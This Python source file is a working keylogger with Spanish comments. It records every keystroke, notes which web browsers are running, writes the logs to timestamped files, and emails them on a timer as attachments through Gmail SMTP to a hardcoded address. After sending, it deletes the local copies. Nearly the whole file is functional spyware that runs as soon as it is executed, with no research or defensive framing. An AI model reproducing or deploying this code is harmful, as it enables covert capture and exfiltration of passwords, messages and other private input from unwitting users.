import pynput.keyboard
import threading
import smtplib, datetime, psutil, socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import socket
from os import remove
from email import encoders

class Keylogger:

    def __init__(self, time_interval = 20, interval_file = 60):  #  inicia el objeto keylogger
        self.log = "Keylogger started"  #  primer valor del registro
        self.interval = time_interval   #  intervalo entre reportes
        self.current_process = "programas de interes"
        self.filename = ''  #  lista de programas de interes ejecutandose
        self.email = 'fulano@gmail.com'
        self.password = 'Password'
        self.interval_file = interval_file     #  intervalo de creacion de registros
        #self.count = 0
        self.file_names = []        #  lista de nombre de los registros que han sido creados, en existencia

    def interesting_process(self): #  lista los procesos de interes y los envia a un conjunto, para eviatr la repeticion
        self.current_process = ''
        pi = set()
        intersting = ['brave.exe', 'chrome.exe', 'edge.exe', 'firefox.exe', 'opera.exe', 'chromium.exe']
        for process in psutil.process_iter():
            for i in intersting:
                if process.name() == i :
                    pi.add(i)

        pi = list(pi)
        for p in pi:
            self.current_process = self.current_process + '||-' + p +'-||'
        fecha = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        print('escaneo de aplicaciones completo')
        return '{}\n{}'.format(fecha, self.current_process)

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):   #  procesa las teclas interceptadas
        keys = str(key).replace("'", "")
        numbers = {'<96>':'0','<97>':'1','<98>':'2','<99>':'3','<100>':'4','<101>':'5','<102>':'6','<103>':'7','<104>':'8','<105>':'9'}
        if keys == 'Key.space':
            keys= ' '
        elif keys == 'Key.backspace':
            keys='$'
        elif keys == 'Key.enter':
            keys='\n'
        elif keys in numbers:  #muestra numeros de manera correcta
            for t,n in numbers.items():
                if keys == t:
                    keys = n
        self.append_to_log(keys)

    def file_name(self):    #  crea,nombra,abre y cierra el archivo del registro cada cierto tiempo
        fecha = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        self.filename = "keylogger_{}.txt".format(fecha)
        file = open(self.filename, 'w', encoding='utf-8')
        file.write('{} \n {}'.format(self.current_process,self.log))
        file.close()
        #self.file_names.append(self.filename)
        timer1 = threading.Timer(self.interval_file, self.file_name)
        timer1.start()
        print('nuevo registro creado')
    def send_mail(self,email,password,message,):    #  envia los correos
        server = smtplib.SMTP("smtp.gmail.com", 587)    #escoge el servidor de correo a usar
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit
        print('correo enviado exitosamente')

    def message(self, patch,texto='None'):      #  convierte los archivos en mensajes
        msg = MIMEMultipart()
        msg['Subject'] = patch
        msg.attach(MIMEText(texto, 'plain'))

        adj = MIMEBase('application', 'octet-stream')
        with open(patch, 'rb') as file:
            adj.set_payload(file.read())
        encoders.encode_base64(adj)
        adj.add_header('Content-Disposition', 'attachment; filename="{}"'.format(patch))
        msg.attach(adj)
        return msg.as_string()

    def report_email(self): #  Gestiona el envio y la estructura de correos
        if self.connection_test() == True:
            for i in self.file_names:
                self.send_mail(self.email, self.password, self.message(i) )
                remove(self.file_names[self.file_names.index(i)])        #  borra los registros que ya fueron enviados
                self.file_names.remove(i)       #  borra el nombre de la lista de los registros por enviar
            print('registros enviados exitosamente')
        else:
            pass
        timer2 = threading.Timer(self.interval_file*2, self.report_email)
        timer2.start()


    def connection_test(self):  #  comprueba  la conexion a internet
        try:
            socket.create_connection(("www.google.com", 80))

            return True
        except OSError:
            print('conexion a internet fallida')
            return False

    def report(self,):  #  reescribe el registro cada cierto tiempo
        file = open(self.filename, 'a', encoding='utf-8')
        file.write('\n{}\n{}\n'.format(self.current_process,self.log))
        file.close()
        self.log = ""
        self.current_process = self.interesting_process()
        #self.count = self.count + 1
        #if self.count == 6 :
        print('nuevo reporte añadido')
        self.file_names.append(self.filename)
        self.file_names = list(set(self.file_names))
        self.file_names.sort()
        print(self.file_names)
        timer = threading.Timer(self.interval, self.report)     #  temporizador
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.file_name()
            self.report()
            self.report_email()
            print('keylogger iniciado')
            keyboard_listener.join()


my_keylogger = Keylogger(10)
my_keylogger.start()
